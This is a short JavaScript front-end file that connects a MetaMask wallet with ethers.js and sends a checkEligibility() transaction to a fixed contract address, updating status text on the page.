const contractAddress = "0x549480f557DB658FdF438edD342937D70a9DD820"; // آدرس جدید قرارداد A
const contractABI = [
  "function checkEligibility() public",
];

let provider;
let signer;
let contract;

async function connectWallet() {
  if (window.ethereum) {
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      provider = new ethers.providers.Web3Provider(window.ethereum);
      signer = provider.getSigner();
      contract = new ethers.Contract(contractAddress, contractABI, signer);
      document.getElementById("status").innerText = "✅ Wallet connected";
      document.getElementById("checkEligibility").disabled = false;
    } catch (error) {
      console.error("Wallet connection error:", error);
      document.getElementById("status").innerText = "❌ Wallet connection failed";
    }
  } else {
    document.getElementById("status").innerText = "❌ MetaMask not detected";
  }
}

async function checkEligibility() {
  if (!contract) return;
  try {
    const tx = await contract.checkEligibility();
    await tx.wait();
    document.getElementById("status").innerText = "✅ Eligibility confirmed";
  } catch (error) {
    console.error("Eligibility check error:", error);
    document.getElementById("status").innerText = "❌ Eligibility check failed";
  }
}

document.getElementById("connectWallet").addEventListener("click", connectWallet);
document.getElementById("checkEligibility").addEventListener("click", checkEligibility);
